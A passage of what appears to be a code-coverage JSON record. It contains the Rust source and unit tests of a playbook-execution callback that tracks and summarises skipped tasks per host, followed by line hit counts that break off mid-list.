\"Condition\".bright_black(),\n                    condition.bright_cyan()\n                ));\n            }\n        }\n\n        if self.config.verbosity \u003e 0 {\n            output.push_str(\u0026format!(\n                \"\\n  {}: {}\",\n                \"Reason\".bright_black(),\n                task.skip_reason.italic()\n            ));\n        }\n\n        if self.config.show_variable_values \u0026\u0026 !task.variable_context.is_empty() {\n            output.push_str(\u0026format!(\"\\n  {}:\", \"Variables\".bright_black()));\n            for (name, value) in \u0026task.variable_context {\n                output.push_str(\u0026format!(\"\\n    {} = {}\", name.green(), value.yellow()));\n            }\n        }\n\n        output\n    }\n\n    /// Print the skip summary\n    fn print_summary(\u0026self) {\n        let skipped = self.skipped_tasks.read();\n        let total = self.total_count();\n        let affected_hosts = self.get_affected_hosts();\n\n        if skipped.is_empty() {\n            if self.config.verbosity \u003e 0 {\n                println!(\n                    \"\\n{} No tasks were skipped during playbook execution.\",\n                    \"[FULL_SKIP]\".cyan().bold()\n                );\n            }\n            return;\n        }\n\n        // Header\n        println!(\n            \"\\n{} {}\",\n            \"=== SKIP SUMMARY ===\".bright_cyan().bold(),\n            \"=\".repeat(50).bright_black()\n        );\n\n        // Overall statistics\n        println!(\n            \"\\n{}: {} tasks across {} hosts ({:.1}% of {} total tasks)\",\n            \"Total skipped\".bright_white().bold(),\n            skipped.len().to_string().cyan().bold(),\n            affected_hosts.len().to_string().yellow(),\n            self.skip_percentage(),\n            total\n        );\n\n        // Skip patterns\n        if self.config.group_by_condition {\n            let patterns = self.get_skip_patterns();\n\n            if !patterns.is_empty() {\n                println!(\"\\n{}\", \"Skip Patterns:\".bright_white().bold());\n\n                for pattern in patterns.iter().take(10) {\n                    println!(\n                        \"\\n  {} ({} occurrence{})\",\n                        pattern.condition.bright_cyan(),\n                        pattern.count,\n                        if pattern.count == 1 { \"\" } else { \"s\" }\n                    );\n\n                    // Group tasks by name\n                    let mut task_groups: HashMap\u003c\u0026str, Vec\u003c\u0026str\u003e\u003e = HashMap::new();\n                    for (task_name, host) in \u0026pattern.tasks {\n                        task_groups\n                            .entry(task_name.as_str())\n                            .or_default()\n                            .push(host.as_str());\n                    }\n\n                    for (task_name, hosts) in \u0026task_groups {\n                        let hosts_display: String =\n                            if hosts.len() \u003e self.config.max_hosts_per_condition {\n                                let shown: Vec\u003c_\u003e = hosts\n                                    .iter()\n                                    .take(self.config.max_hosts_per_condition)\n                                    .copied()\n                                    .collect();\n                                format!(\n                                    \"{} +{} more\",\n                                    shown.join(\", \"),\n                                    hosts.len() - self.config.max_hosts_per_condition\n                                )\n                            } else {\n                                hosts.join(\", \")\n                            };\n\n                        println!(\n                            \"    {} {} ({})\",\n                            \"-\".bright_black(),\n                            task_name.yellow(),\n                            hosts_display.bright_white()\n                        );\n                    }\n                }\n\n                if patterns.len() \u003e 10 {\n                    println!(\n                        \"\\n  {} more skip patterns...\",\n                        (patterns.len() - 10).to_string().bright_black()\n                    );\n                }\n            }\n        }\n\n        // Per-host breakdown (if verbose)\n        if self.config.verbosity \u003e 1 {\n            println!(\"\\n{}\", \"Per-Host Skip Statistics:\".bright_white().bold());\n\n            let stats = self.host_stats.read();\n            let mut sorted_hosts: Vec\u003c_\u003e = stats.iter().collect();\n            sorted_hosts.sort_by(|a, b| b.1.skipped_tasks.cmp(\u0026a.1.skipped_tasks));\n\n            for (host, host_stats) in sorted_hosts.iter().take(10) {\n                if host_stats.skipped_tasks \u003e 0 {\n                    let skip_rate = if host_stats.total_tasks \u003e 0 {\n                        (host_stats.skipped_tasks as f64 / host_stats.total_tasks as f64) * 100.0\n                    } else {\n                        0.0\n                    };\n\n                    println!(\n                        \"  {}: {} skipped / {} total ({:.1}%)\",\n                        host.bright_white().bold(),\n                        host_stats.skipped_tasks.to_string().cyan(),\n                        host_stats.total_tasks,\n                        skip_rate\n                    );\n                }\n            }\n        }\n\n        // Recommendations\n        if self.skip_percentage() \u003e 50.0 {\n            println!(\n                \"\\n{} High skip rate detected ({:.1}%). Consider reviewing your conditions:\",\n                \"Warning:\".yellow().bold(),\n                self.skip_percentage()\n            );\n            println!(\n                \"  {} Check if conditions are too restrictive\",\n                \"-\".bright_black()\n            );\n            println!(\n                \"  {} Verify variables are defined correctly\",\n                \"-\".bright_black()\n            );\n            println!(\n                \"  {} Consider using 'default' filter for optional variables\",\n                \"-\".bright_black()\n            );\n        }\n\n        println!();\n    }\n\n    /// Generate a JSON report of skip data\n    pub fn to_json_report(\u0026self) -\u003e serde_json::Value {\n        let skipped = self.skipped_tasks.read();\n        let patterns = self.get_skip_patterns();\n\n        serde_json::json!({\n            \"summary\": {\n                \"total_tasks\": self.total_count(),\n                \"skipped_tasks\": skipped.len(),\n                \"skip_percentage\": self.skip_percentage(),\n                \"affected_hosts\": self.get_affected_hosts().len(),\n            },\n            \"skipped_tasks\": skipped.iter().map(|t| {\n                serde_json::json!({\n                    \"task_name\": t.task_name,\n                    \"host\": t.host,\n                    \"when_condition\": t.when_condition,\n                    \"skip_reason\": t.skip_reason,\n                    \"variable_context\": t.variable_context,\n                    \"order\": t.order,\n                })\n            }).collect::\u003cVec\u003c_\u003e\u003e(),\n            \"skip_patterns\": patterns.iter().map(|p| {\n                serde_json::json!({\n                    \"condition\": p.condition,\n                    \"count\": p.count,\n                    \"tasks\": p.tasks.iter().map(|(t, h)| {\n                        serde_json::json!({\"task\": t, \"host\": h})\n                    }).collect::\u003cVec\u003c_\u003e\u003e(),\n                })\n            }).collect::\u003cVec\u003c_\u003e\u003e(),\n        })\n    }\n}\n\nimpl Default for FullSkipCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for FullSkipCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            skipped_tasks: RwLock::new(self.skipped_tasks.read().clone()),\n            host_stats: RwLock::new(self.host_stats.read().clone()),\n            playbook_start: RwLock::new(*self.playbook_start.read()),\n            current_playbook: RwLock::new(self.current_playbook.read().clone()),\n            task_counter: std::sync::atomic::AtomicU64::new(\n                self.task_counter.load(std::sync::atomic::Ordering::SeqCst),\n            ),\n            total_tasks: std::sync::atomic::AtomicU64::new(\n                self.total_tasks.load(std::sync::atomic::Ordering::SeqCst),\n            ),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for FullSkipCallback {\n    /// Called when a playbook starts - initialize tracking\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        *self.playbook_start.write() = Some(Instant::now());\n        *self.current_playbook.write() = Some(name.to_string());\n\n        // Clear stats from any previous run\n        self.skipped_tasks.write().clear();\n        self.host_stats.write().clear();\n        self.task_counter\n            .store(0, std::sync::atomic::Ordering::SeqCst);\n        self.total_tasks\n            .store(0, std::sync::atomic::Ordering::SeqCst);\n\n        if self.config.verbosity \u003e 0 {\n            println!(\n                \"{} Skip tracking enabled for playbook: {}\",\n                \"[FULL_SKIP]\".cyan().bold(),\n                name.bright_white()\n            );\n        }\n    }\n\n    /// Called when a playbook ends - print summary\n    async fn on_playbook_end(\u0026self, _name: \u0026str, _success: bool) {\n        if self.config.show_summary {\n            self.print_summary();\n        }\n    }\n\n    /// Called when a play starts - initialize host stats\n    async fn on_play_start(\u0026self, _name: \u0026str, hosts: \u0026[String]) {\n        let mut stats = self.host_stats.write();\n        for host in hosts {\n            stats.entry(host.clone()).or_default();\n        }\n    }\n\n    /// Called when a play ends - silent\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Nothing to do here\n    }\n\n    /// Called when a task starts - silent\n    async fn on_task_start(\u0026self, _name: \u0026str, _host: \u0026str) {\n        // Nothing to do here\n    }\n\n    /// Called when a task completes - track skipped tasks\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        // Increment total task counter\n        self.total_tasks\n            .fetch_add(1, std::sync::atomic::Ordering::SeqCst);\n\n        // Update host stats\n        {\n            let mut stats = self.host_stats.write();\n            let host_stats = stats.entry(result.host.clone()).or_default();\n            host_stats.total_tasks += 1;\n\n            if result.result.skipped {\n                host_stats.skipped_tasks += 1;\n            }\n        }\n\n        // Only process skipped tasks\n        if !result.result.skipped {\n            return;\n        }\n\n        let order = self\n            .task_counter\n            .fetch_add(1, std::sync::atomic::Ordering::SeqCst);\n        let message = result.result.message.as_str();\n\n        // Parse the skip reason\n        let (condition, reason) = Self::parse_skip_reason(message);\n\n        let mut skipped_task =\n            SkippedTask::new(result.task_name.clone(), result.host.clone(), reason, order);\n\n        if let Some(cond) = condition {\n            skipped_task = skipped_task.with_condition(cond.clone());\n\n            // Update condition statistics\n            let mut stats = self.host_stats.write();\n            if let Some(host_stats) = stats.get_mut(\u0026result.host) {\n                *host_stats.skip_conditions.entry(cond).or_default() += 1;\n            }\n        }\n\n        // Print inline if configured\n        if self.config.show_inline {\n            println!(\"{}\", self.format_skip_inline(\u0026skipped_task));\n        }\n\n        // Store the skipped task\n        self.skipped_tasks.write().push(skipped_task);\n    }\n\n    /// Called when a handler is triggered - silent\n    async fn on_handler_triggered(\u0026self, _name: \u0026str) {\n        // Nothing to do here\n    }\n\n    /// Called when facts are gathered - silent\n    async fn on_facts_gathered(\u0026self, _host: \u0026str, _facts: \u0026Facts) {\n        // Nothing to do here\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success: true,\n                changed: false,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(10),\n            notify: Vec::new(),\n        }\n    }\n\n    #[tokio::test]\n    async fn test_full_skip_callback_creation() {\n        let callback = FullSkipCallback::new();\n        assert!(callback.config.show_inline);\n        assert!(callback.config.show_summary);\n        assert_eq!(callback.skip_count(), 0);\n    }\n\n    #[tokio::test]\n    async fn test_skip_tracking() {\n        let callback = FullSkipCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // Simulate a skipped task\n        let result = create_execution_result(\n            \"host1\",\n            \"Install nginx\",\n            true,\n            \"Skipped: condition 'ansible_os_family == \\\"Debian\\\"' was false\",\n        );\n        callback.on_task_complete(\u0026result).await;\n\n        assert_eq!(callback.skip_count(), 1);\n        assert_eq!(callback.total_count(), 1);\n\n        let skipped = callback.get_skipped_tasks();\n        assert_eq!(skipped[0].task_name, \"Install nginx\");\n        assert_eq!(skipped[0].host, \"host1\");\n        assert!(skipped[0].when_condition.is_some());\n    }\n\n    #[tokio::test]\n    async fn test_skip_patterns() {\n        let callback = FullSkipCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\n                \"test-play\",\n                \u0026[\n                    \"host1\".to_string(),\n                    \"host2\".to_string(),\n                    \"host3\".to_string(),\n                ],\n            )\n            .await;\n\n        // Multiple tasks skipped with same condition\n        for host in [\"host1\", \"host2\", \"host3\"] {\n            let result = create_execution_result(\n                host,\n                \"Install nginx\",\n                true,\n                \"Skipped: condition 'nginx_enabled' was false\",\n            );\n            callback.on_task_complete(\u0026result).await;\n        }\n\n        let patterns = callback.get_skip_patterns();\n        assert_eq!(patterns.len(), 1);\n        assert_eq!(patterns[0].count, 3);\n        assert!(patterns[0].condition.contains(\"nginx_enabled\"));\n    }\n\n    #[tokio::test]\n    async fn test_non_skipped_tasks_not_tracked() {\n        let callback = FullSkipCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // Non-skipped task\n        let result = create_execution_result(\n            \"host1\",\n            \"Install nginx\",\n            false,\n            \"Package installed successfully\",\n        );\n        callback.on_task_complete(\u0026result).await;\n\n        assert_eq!(callback.skip_count(), 0);\n        assert_eq!(callback.total_count(), 1);\n    }\n\n    #[tokio::test]\n    async fn test_skip_percentage() {\n        let callback = FullSkipCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // 2 normal tasks\n        for _ in 0..2 {\n            let result = create_execution_result(\"host1\", \"Normal task\", false, \"OK\");\n            callback.on_task_complete(\u0026result).await;\n        }\n\n        // 2 skipped tasks\n        for _ in 0..2 {\n            let result = create_execution_result(\n                \"host1\",\n                \"Skipped task\",\n                true,\n                \"Skipped: condition 'false' was false\",\n            );\n            callback.on_task_complete(\u0026result).await;\n        }\n\n        assert_eq!(callback.total_count(), 4);\n        assert_eq!(callback.skip_count(), 2);\n        assert!((callback.skip_percentage() - 50.0).abs() \u003c 0.01);\n    }\n\n    #[tokio::test]\n    async fn test_affected_hosts() {\n        let callback = FullSkipCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\n                \"test-play\",\n                \u0026[\n                    \"host1\".to_string(),\n                    \"host2\".to_string(),\n                    \"host3\".to_string(),\n                ],\n            )\n            .await;\n\n        // Skip on host1 and host2 only\n        let result1 =\n            create_execution_result(\"host1\", \"Task\", true, \"Skipped: condition 'X' was false\");\n        callback.on_task_complete(\u0026result1).await;\n\n        let result2 =\n            create_execution_result(\"host2\", \"Task\", true, \"Skipped: condition 'X' was false\");\n        callback.on_task_complete(\u0026result2).await;\n\n        let result3 = create_execution_result(\"host3\", \"Task\", false, \"OK\");\n        callback.on_task_complete(\u0026result3).await;\n\n        let affected = callback.get_affected_hosts();\n        assert_eq!(affected.len(), 2);\n        assert!(affected.contains(\u0026\"host1\".to_string()));\n        assert!(affected.contains(\u0026\"host2\".to_string()));\n    }\n\n    #[tokio::test]\n    async fn test_parse_skip_reason() {\n        let (cond, reason) = FullSkipCallback::parse_skip_reason(\n            \"Skipped: condition 'ansible_os_family == \\\"Debian\\\"' was false\",\n        );\n        assert!(cond.is_some());\n        assert!(cond.unwrap().contains(\"ansible_os_family\"));\n        assert!(reason.contains(\"evaluated to false\"));\n\n        let (cond2, reason2) = FullSkipCallback::parse_skip_reason(\"Skipped: some other reason\");\n        assert!(cond2.is_none());\n        assert_eq!(reason2, \"some other reason\");\n    }\n\n    #[tokio::test]\n    async fn test_json_report() {\n        let callback = FullSkipCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let result =\n            create_execution_result(\"host1\", \"Task\", true, \"Skipped: condition 'X' was false\");\n        callback.on_task_complete(\u0026result).await;\n\n        let report = callback.to_json_report();\n\n        assert!(report.get(\"summary\").is_some());\n        assert!(report.get(\"skipped_tasks\").is_some());\n        assert!(report.get(\"skip_patterns\").is_some());\n\n        let summary = \u0026report[\"summary\"];\n        assert_eq!(summary[\"skipped_tasks\"], 1);\n        assert_eq!(summary[\"total_tasks\"], 1);\n    }\n\n    #[tokio::test]\n    async fn test_reset() {\n        let callback = FullSkipCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let result =\n            create_execution_result(\"host1\", \"Task\", true, \"Skipped: condition 'X' was false\");\n        callback.on_task_complete(\u0026result).await;\n\n        assert_eq!(callback.skip_count(), 1);\n\n        callback.reset();\n\n        assert_eq!(callback.skip_count(), 0);\n        assert_eq!(callback.total_count(), 0);\n    }\n\n    #[test]\n    fn test_skipped_task_builder() {\n        let task = SkippedTask::new(\n            \"Install nginx\".to_string(),\n            \"host1\".to_string(),\n            \"Condition was false\".to_string(),\n            0,\n        )\n        .with_condition(\"ansible_os_family == 'Debian'\".to_string())\n        .with_variable(\"ansible_os_family\".to_string(), \"RedHat\".to_string());\n\n        assert_eq!(task.task_name, \"Install nginx\");\n        assert!(task.when_condition.is_some());\n        assert_eq!(task.variable_context.len(), 1);\n    }\n\n    #[test]\n    fn test_extract_condition() {\n        let task = SkippedTask::new(\n            \"Task\".to_string(),\n            \"host\".to_string(),\n            \"Skipped: condition 'my_var == true' was false\".to_string(),\n            0,\n        );\n\n        let condition = task.extract_condition();\n        assert!(condition.contains(\"my_var\"));\n\n        let task_with_condition = task.with_condition(\"explicit_condition\".to_string());\n        assert_eq!(\n            task_with_condition.extract_condition(),\n            \"explicit_condition\"\n        );\n    }\n\n    #[test]\n    fn test_config_defaults() {\n        let config = FullSkipConfig::default();\n        assert!(config.show_variable_values);\n        assert!(config.show_inline);\n        assert!(config.show_summary);\n        assert!(config.group_by_condition);\n        assert_eq!(config.max_hosts_per_condition, 5);\n        assert!(config.show_condition_expression);\n        assert_eq!(config.verbosity, 1);\n    }\n\n    #[tokio::test]\n    async fn test_host_skip_stats() {\n        let callback = FullSkipCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // 1 skipped, 2 normal\n        let skipped =\n            create_execution_result(\"host1\", \"Task1\", true, \"Skipped: condition 'X' was false\");\n        callback.on_task_complete(\u0026skipped).await;\n\n        let normal1 = create_execution_result(\"host1\", \"Task2\", false, \"OK\");\n        callback.on_task_complete(\u0026normal1).await;\n\n        let normal2 = create_execution_result(\"host1\", \"Task3\", false, \"OK\");\n        callback.on_task_complete(\u0026normal2).await;\n\n        let stats = callback.host_stats.read();\n        let host_stats = stats.get(\"host1\").unwrap();\n\n        assert_eq!(host_stats.total_tasks, 3);\n        assert_eq!(host_stats.skipped_tasks, 1);\n    }\n\n    #[test]\n    fn test_clone() {\n        let callback = FullSkipCallback::new();\n        let cloned = callback.clone();\n\n        assert!(cloned.config.show_inline);\n        assert_eq!(cloned.skip_count(), 0);\n    }\n}\n","traces":[{"line":67,"address":[30847728],"length":1,"stats":{"Line":1}},{"line":102,"address":[30825456,30825871,30825925],"length":1,"stats":{"Line":1}},{"line":108,"address":[30825558],"length":1,"stats":{"Line":1}},{"line":109,"address":[30825621],"length":1,"stats":{"Line":1}},{"line":115,"address":[30825184,30825346],"length":1,"stats":{"Line":1}},{"line":116,"address":[30825211,30825299],"length":1,"stats":{"Line":2}},{"line":117,"address":[30825326],"length":1,"stats":{"Line":1}},{"line":121,"address":[30825153,30825040],"length":1,"stats":{"Line":1}},{"line":122,"address":[30825107,30825059],"length":1,"stats":{"Line":2}},{"line":123,"address":[30825133],"length":1,"stats":{"Line":1}},{"line":127,"address":[30825376],"length":1,"stats":{"Line":1}},{"line":128,"address":[31958384],"length":1,"stats":{"Line":2}},{"line":130,"address":[31958416],"length":1,"stats":{"Line":1}},{"line":131,"address":[31958490,31958587],"length":1,"stats":{"Line":2}},{"line":132,"address":[31958602],"length":1,"stats":{"Line":1}},{"line":136,"address":[31958562],"length":1,"stats":{"Line":0}},{"line":189,"address":[30843792],"length":1,"stats":{"Line":1}},{"line":190,"address":[30843806],"length":1,"stats":{"Line":1}},{"line":195,"address":[30826112,30826681],"length":1,"stats":{"Line":1}},{"line":198,"address":[30826144],"length":1,"stats":{"Line":1}},{"line":199,"address":[30826172,30826229],"length":1,"stats":{"Line":2}},{"line":200,"address":[30826249],"length":1,"stats":{"Line":1}},{"line":201,"address":[30826300],"length":1,"stats":{"Line":1}},{"line":202,"address":[30826335,30826389],"length":1,"stats":{"Line":2}},{"line":203,"address":[30826417],"length":1,"stats":{"Line":1}},{"line":208,"address":[30844522,30844528,30843856],"length":1,"stats":{"Line":1}},{"line":209,"address":[30843873],"length":1,"stats":{"Line":1}},{"line":210,"address":[30843973],"length":1,"stats":{"Line":1}},{"line":211,"address":[30844072],"length":1,"stats":{"Line":1}},{"line":212,"address":[30844171,30844499,30844332,30844278],"length":1,"stats":{"Line":1}},{"line":213,"address":[30844439],"length":1,"stats":{"Line":1}},{"line":214,"address":[30844446],"length":1,"stats":{"Line":1}},{"line":215,"address":[30844465],"length":1,"stats":{"Line":1}},{"line":216,"address":[30844472],"length":1,"stats":{"Line":1}},{"line":220,"address":[30839241,30839104,30839235],"length":1,"stats":{"Line":1}},{"line":221,"address":[30839136,30839208],"length":1,"stats":{"Line":2}},{"line":225,"address":[30825952,30826060,30826066],"length":1,"stats":{"Line":1}},{"line":226,"address":[30825961,30826028],"length":1,"stats":{"Line":2}},{"line":230,"address":[30826080],"length":1,"stats":{"Line":1}},{"line":231,"address":[30826085],"length":1,"stats":{"Line":1}},{"line":235,"address":[30837984],"length":1,"stats":{"Line":1}},{"line":236,"address":[30837997],"length":1,"stats":{"Line":1}},{"line":237,"address":[30838012],"length":1,"stats":{"Line":1}},{"line":238,"address":[30838018],"length":1,"stats":{"Line":0}},{"line":240,"address":[30838033],"length":1,"stats":{"Line":1}},{"line":244,"address":[30839081,30838144,30838817],"length":1,"stats":{"Line":1}},{"line":245,"address":[30838182],"length":1,"stats":{"Line":1}},{"line":246,"address":[30838218],"length":1,"stats":{"Line":1}},{"line":248,"address":[30838265,30838336],"length":1,"stats":{"Line":2}},{"line":249,"address":[30838526],"length":1,"stats":{"Line":1}},{"line":250,"address":[30839058],"length":1,"stats":{"Line":1}},{"line":251,"address":[30838847],"length":1,"stats":{"Line":1}},{"line":253,"address":[30838879],"length":1,"stats":{"Line":1}},{"line":256,"address":[30838536],"length":1,"stats":{"Line":1}},{"line":258,"address":[31962535,31962361,31962336,31962606,31962628],"length":1,"stats":{"Line":4}},{"line":259,"address":[31962401],"length":1,"stats":{"Line":1}},{"line":260,"address":[31962469],"length":1,"stats":{"Line":1}},{"line":261,"address":[31962499],"length":1,"stats":{"Line":1}},{"line":266,"address":[30838669,30838736],"length":1,"stats":{"Line":2}},{"line":267,"address":[30838748],"length":1,"stats":{"Line":1}},{"line":271,"address":[30843568,30843773,30843767],"length":1,"stats":{"Line":1}},{"line":272,"address":[30843604],"length":1,"stats":{"Line":1}},{"line":273,"address":[30843630],"length":1,"stats":{"Line":1}},{"line":275,"address":[30843703],"length":1,"stats":{"Line":3}},{"line":276,"address":[31962704,31962744],"length":1,"stats":{"Line":3}},{"line":281,"address":[30840069,30839264,30840063],"length":1,"stats":{"Line":1}},{"line":287,"address":[30839323],"length":1,"stats":{"Line":1}},{"line":288,"address":[30839455,30839380],"length":1,"stats":{"Line":2}},{"line":289,"address":[30839727,30839544],"length":1,"stats":{"Line":1}},{"line":290,"address":[30839700,30839781],"length":1,"stats":{"Line":2}},{"line":291,"address":[30839886],"length":1,"stats":{"Line":1}},{"line":295,"address":[30839409],"length":1,"stats":{"Line":1}},{"line":296,"address":[30840142],"length":1,"stats":{"Line":1}},{"line":297,"address":[30840182],"length":1,"stats":{"Line":1}},{"line":300,"address":[30840276,30840102],"length":1,"stats":{"Line":0}},{"line":304,"address":[30840416,30843540,30841834],"length":1,"stats":{"Line":1}},{"line":305,"address":[30840568,30840792,30840705],"length":1,"stats":{"Line":1}},{"line":307,"address":[30840471],"length":1,"stats":{"Line":1}},{"line":308,"address":[30840628,30840541],"length":1,"stats":{"Line":2}},{"line":309,"address":[30840765,30840682],"length":1,"stats":{"Line":2}},{"line":312,"address":[30841144],"length":1,"stats":{"Line":1}},{"line":313,"address":[30841187],"length":1,"stats":{"Line":1}},{"line":314,"address":[30841354,30841438,30841805],"length":1,"stats":{"Line":2}},{"line":316,"address":[30841248],"length":1,"stats":{"Line":1}},{"line":317,"address":[30841331,30841411],"length":1,"stats":{"Line":2}},{"line":322,"address":[30841161],"length":1,"stats":{"Line":1}},{"line":323,"address":[30841926,30842362,30842007],"length":1,"stats":{"Line":2}},{"line":325,"address":[30841866],"length":1,"stats":{"Line":1}},{"line":326,"address":[30841905,30841980],"length":1,"stats":{"Line":2}},{"line":330,"address":[30841848,30842458],"length":1,"stats":{"Line":2}},{"line":331,"address":[30842483],"length":1,"stats":{"Line":0}},{"line":332,"address":[30842833],"length":1,"stats":{"Line":0}},{"line":333,"address":[30843009],"length":1,"stats":{"Line":0}},{"line":337,"address":[30842407],"length":1,"stats":{"Line":1}},{"line":341,"address":[30826704,30835057,30829732],"length":1,"stats":{"Line":0}},{"line":342,"address":[30826742],"length":1,"stats":{"Line":0}},{"line":343,"address":[30826770,30826841],"length":1,"stats":{"Line":0}},{"line":344,"address":[30826857],"length":1,"stats":{"Line":0}},{"line":346,"address":[30826872,30826936],"length":1,"stats":{"Line":0}},{"line":347,"address":[30827002],"length":1,"stats":{"Line":0}},{"line":348,"address":[30834811],"length":1,"stats":{"Line":0}},{"line":357,"address":[30827238,30827154,30827079],"length":1,"stats":{"Line":0}},{"line":364,"address":[30827627,30827776,30827560],"length":1,"stats":{"Line":0}},{"line":374,"address":[30828604],"length":1,"stats":{"Line":0}},{"line":375,"address":[30828655],"length":1,"stats":{"Line":0}},{"line":377,"address":[30828731,30828670],"length":1,"stats":{"Line":0}},{"line":378,"address":[30828737,30828786],"length":1,"stats":{"Line":0}},{"line":380,"address":[30828988],"length":1,"stats":{"Line":0}},{"line":381,"address":[30829796],"length":1,"stats":{"Line":0}},{"line":389,"address":[30830158],"length":1,"stats":{"Line":0}},{"line":390,"address":[30830173,30830260],"length":1,"stats":{"Line":0}},{"line":391,"address":[30832181],"length":1,"stats":{"Line":0}},{"line":392,"address":[30830394,30832085],"length":1,"stats":{"Line":0}},{"line":394,"address":[30832123],"length":1,"stats":{"Line":0}},{"line":397,"address":[30830436],"length":1,"stats":{"Line":0}},{"line":398,"address":[30830611,30830664],"length":1,"stats":{"Line":0}},{"line":400,"address":[30830716],"length":1,"stats":{"Line":0}},{"line":402,"address":[30830894],"length":1,"stats":{"Line":0}},{"line":405,"address":[30831290,30831116,30831226],"length":1,"stats":{"Line":0}},{"line":407,"address":[30831057,30830962],"length":1,"stats":{"Line":0}},{"line":408,"address":[30831097,30831269,30831176],"length":1,"stats":{"Line":0}},{"line":411,"address":[30830681,30830759],"length":1,"stats":{"Line":0}},{"line":414,"address":[30831681,30831601],"length":1,"stats":{"Line":0}},{"line":423,"address":[30829285],"length":1,"stats":{"Line":0}},{"line":424,"address":[30829551,30829464],"length":1,"stats":{"Line":0}},{"line":433,"address":[30828621],"length":1,"stats":{"Line":0}},{"line":434,"address":[30832213],"length":1,"stats":{"Line":0}},{"line":436,"address":[30832446],"length":1,"stats":{"Line":0}},{"line":437,"address":[30832561,30832496],"length":1,"stats":{"Line":0}},{"line":438,"address":[30832599,30832663],"length":1,"stats":{"Line":0}},{"line":440,"address":[30832678],"length":1,"stats":{"Line":0}},{"line":441,"address":[30832936],"length":1,"stats":{"Line":0}},{"line":442,"address":[30834045,30834066],"length":1,"stats":{"Line":0}},{"line":443,"address":[30834073],"length":1,"stats":{"Line":0}},{"line":445,"address":[30834054],"length":1,"stats":{"Line":0}},{"line":448,"address":[30834203,30834281,30834349],"length":1,"stats":{"Line":0}},{"line":460,"address":[30832194,30832997],"length":1,"stats":{"Line":0}},{"line":461,"address":[30833186,30833119],"length":1,"stats":{"Line":0}},{"line":466,"address":[30833384],"length":1,"stats":{"Line":0}},{"line":470,"address":[30833582],"length":1,"stats":{"Line":0}},{"line":474,"address":[30833780],"length":1,"stats":{"Line":0}},{"line":480,"address":[30833011,30833981],"length":1,"stats":{"Line":0}},{"line":484,"address":[30837829,30835072,30837967],"length":1,"stats":{"Line":1}},{"line":485,"address":[30835122],"length":1,"stats":{"Line":1}},{"line":486,"address":[30835214],"length":1,"stats":{"Line":1}},{"line":488,"address":[30835269,30837484,30835313,30837334,30836095,30837807,30837024,30835913,30835633,30836351,30836879,30835415,30837457,30837835,30835817,30835563,30836167,30837051,30836489,30836419],"length":1,"stats":{"Line":8}},{"line":490,"address":[30835548,30835609],"length":1,"stats":{"Line":2}},{"line":491,"address":[30835802,30835866],"length":1,"stats":{"Line":2}},{"line":492,"address":[30836142,30836082],"length":1,"stats":{"Line":2}},{"line":493,"address":[30836344,30836395,30836465],"length":1,"stats":{"Line":3}},{"line":495,"address":[31961465,31961578,31959936],"length":1,"stats":{"Line":3}},{"line":496,"address":[31959974,31960784,31960348,31961219,31960140,31961443,31961471,31961000,31960564],"length":1,"stats":{"Line":1}},{"line":504,"address":[31961435],"length":1,"stats":{"Line":2}},{"line":505,"address":[31959858,31958784,31959908],"length":1,"stats":{"Line":3}},{"line":506,"address":[31959552,31959836,31958967,31959402,31958822,31959180,31959864,31959525],"length":1,"stats":{"Line":2}},{"line":509,"address":[31961632,31962246,31961600,31959456,31962221,31959377],"length":1,"stats":{"Line":4}},{"line":510,"address":[31962199,31961667,31961776,31961976,31962227],"length":1,"stats":{"Line":1}},{"line":511,"address":[31962191,31959518],"length":1,"stats":{"Line":2}},{"line":513,"address":[31959828],"length":1,"stats":{"Line":2}},{"line":519,"address":[30847776],"length":1,"stats":{"Line":0}},{"line":520,"address":[30847784],"length":1,"stats":{"Line":0}},{"line":525,"address":[30846384,30847557,30847614],"length":1,"stats":{"Line":1}},{"line":527,"address":[30846414],"length":1,"stats":{"Line":1}},{"line":528,"address":[30846529,30846436],"length":1,"stats":{"Line":2}},{"line":529,"address":[30846564,30846710,30846629],"length":1,"stats":{"Line":3}},{"line":530,"address":[30846883,30846745,30846810],"length":1,"stats":{"Line":3}},{"line":531,"address":[30847010,30846909],"length":1,"stats":{"Line":2}},{"line":532,"address":[30847126],"length":1,"stats":{"Line":1}},{"line":535,"address":[30847201],"length":1,"stats":{"Line":1}},{"line":545,"address":[30824307],"length":1,"stats":{"Line":4}},{"line":546,"address":[31952870,31952979],"length":1,"stats":{"Line":2}},{"line":547,"address":[31953103,31953372,31953310,31953130,31954224],"length":1,"stats":{"Line":1}},{"line":550,"address":[31953503],"length":1,"stats":{"Line":1}},{"line":551,"address":[31